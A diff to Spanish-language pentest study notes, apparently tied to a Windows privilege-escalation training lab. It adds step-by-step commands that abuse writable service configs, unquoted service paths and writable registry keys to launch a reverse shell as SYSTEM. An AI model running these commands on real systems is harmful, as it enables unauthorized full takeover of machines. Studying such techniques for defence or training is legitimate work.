@@ -21,6 +21,9 @@ Técnicas utilizadas para escalar privilegios en sistemas basados en Windows.
   - [SeBackupPrivilege & SeRestorePrivilege](#SeBackupPrivilege-And-SeRestorePrivilege)
 - [Privileged Groups](#whoami-groups)
 - [Servicios Vulnerables](#Servicios-Vulnerables)
+  - [Insecure Permissions](#Insecure Permissions)
+  - [Unquoted Service Path](#Unquoted Service Path)
+  - [Weak Registry Permissions](#Weak Registry Permissions)
 
 ## whoami priv
 
@@ -129,13 +132,78 @@ accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
 accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
 ```
 
-### Insecure Permissions daclsvc
+### Insecure Permissions
 
-**Usando accesschk.exe para verificar los permisos del usuario actual sobre un servicio en específico**
+**Podemos usar accesschk.exe para verificar los permisos del usuario actual sobre un servicio en específico**
 ```cmd
 .\accesschk.exe /accepteula -uwcqv <user> daclsvc
 ```
+**En caso de tener el permiso `SERVICE_CHANGE_CONFIG` podemos aprovecharnos y modificar la propiedad `BINARY_PATH_NAME`**
 
+Es necesario consultar si el servicio corre como SYSTEM mirando la propiedad `SERVICE_START_NAME`
+```cmd
+sc qc daclsvc
+```
+Modificamos la configuración del servicio y establecemos el BINARY_PATH_NAME (binpath) al de una reverse shell o un binario que queramos ejecutar
+
+```cmd
+sc config daclsvc binpath= "C:\tmp\reverse.exe"
+```
+Ponemos un socket de escucha e iniciamos el servicio
+
+```cmd
+net start daclsvc
+```
+
+### Unquoted Service Path 
+
+[Explicación](https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae#:~:text=When%20a%20service%20is%20created,of%20the%20time%20it%20is)
+
+
+**Primero debemos verificar que el servicio está corriendo como SYSTEM observando la propiedad `SERVICE_START_NAME` y también checkear si el nombre tiene espacios en el path mirando la propiedad `BINARY_PATH_NAME` **
+
+```cmd
+sc qc unquotedsvc
+```
+
+**Luego verificamos los permisos de la carpeta donde se ubica el binario real**
+```cmd
+.\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
+icacls "C:\Program Files\A Subfolder"
+```
+**Ahora copiamos la reverse shell en el folder final donde se situaba el binario**
+
+```cmd
+copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
+```
+
+**Iniciamos el servicio**
+```cmd
+net start unquotedsvc
+```
+
+### Weak Registry Permissions
+
+Consultamos el servicio `regsvc` y verificamos si está corriendo como SYSTEM (`SERVICE_START_NAME`).
+```cmd
+sc qc regsvc
+```
+Verificamos si el servicio es writable por algun grupo al que pertenezcamos, si sale `NT_AUTHORITY\Interactive` quiere decir que es modificable por cualquier usuario logueado.
+
+```cmd
+C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
+```
+
+Sobrescribimos la llave del registro ImagePath para que apunte al ejecutable reverse.exe que hemos creado
+
+```cmd
+reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
+```
+Iniciamos un listener en Parrot y luego iniciamos el servicio para generar una shell reversa que se ejecute con privilegios de SYSTEM
+
+```cmd
+net start regsvc
+```
 
 
 
